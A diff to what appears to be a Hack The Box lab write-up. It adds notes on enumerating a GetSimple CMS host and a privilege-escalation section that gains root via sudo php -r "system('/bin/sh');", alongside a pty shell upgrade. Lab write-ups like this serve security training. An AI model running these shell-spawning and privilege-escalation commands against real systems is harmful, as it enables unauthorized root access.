@@ -25,7 +25,7 @@ Host is Ubuntu with a http web server running on port 80.
 
 ### whatweb
 whatweb <target_ip>
-Findings: Apache 2.4.41, GetSimple CMS detected 
+Findings: Web app is running HTTP Server Apache v2.4.41, GetSimple CMS detected 
 
 ### gobuster
 gobuster dir -u http://<target_ip -w /usr/share/wordlists/dirb/common.txt
@@ -58,9 +58,25 @@ Exploit completed successfully and spawned a shell
 
 <img width="630" height="128" alt="HTBLAB-exploit" src="https://github.com/user-attachments/assets/dcab40ce-4746-4a66-bcd7-f6ff5a3a599e" />
 
-Upgrade shell with "shell" then python script: python3 -c 'import pty; pty.spawn("/bin/bash")'
+Upgrade to Linux shell with "shell" then python script: python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-User flag obtained
+
+## 🚀 Privilege Escalation
+
+Sudo -l gives us the following output: User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+
+We can run php sudo commands without password.
+
+Privilege escalation via GTFObins:
+
+sudo php -r "system('/bin/sh');"
+
+<img width="668" height="105" alt="HTBLAB-root" src="https://github.com/user-attachments/assets/0a94d5bb-d3fa-4511-86db-ee0991bc41c7" />
+
+
+Gained a root shell. 
+
 
 
 
